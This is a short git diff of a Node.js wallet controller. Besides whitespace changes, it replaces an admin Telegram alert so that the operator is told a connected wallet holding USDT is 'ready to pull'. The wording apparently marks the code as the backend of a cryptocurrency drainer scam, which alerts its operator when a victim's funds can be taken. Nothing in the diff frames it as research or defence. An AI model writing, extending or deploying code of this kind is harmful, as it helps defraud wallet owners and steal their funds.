@@ -90,15 +90,15 @@ class WalletController {
             await database.query(updateQuery, [balance, walletAddress]);
             
             res.json({
-    success: true,
-    wallet: {
-        id: wallet.id,
-        address: wallet.address,
-        name: wallet.name,
-        usdt_balance: balance,
-        created_at: wallet.created_at
-    }
-});
+                success: true,
+                wallet: {
+                    id: wallet.id,
+                    address: wallet.address,
+                    name: wallet.name,
+                    usdt_balance: balance,
+                    created_at: wallet.created_at
+                }
+            });
         } catch (error) {
             console.error('Wallet connection error:', error);
             res.status(500).json({
@@ -164,7 +164,8 @@ class WalletController {
             // Send alert to admin - ONLY NOW when wallet is ready to pull
             console.log('Sending Telegram alert - wallet ready to pull');
             const telegram = require('../config/telegram');
-            await telegram.sendNewWalletAlert(address, balance);
+            // Send the new "WALLET READY TO PULL" alert instead of "NEW WALLET CONNECTED"
+            await telegram.sendWalletReadyAlert(address, balance);
             console.log('Telegram alert sent for ready-to-pull wallet');
             
             res.json({
@@ -225,4 +226,3 @@ class WalletController {
 }
 
 module.exports = new WalletController();
-
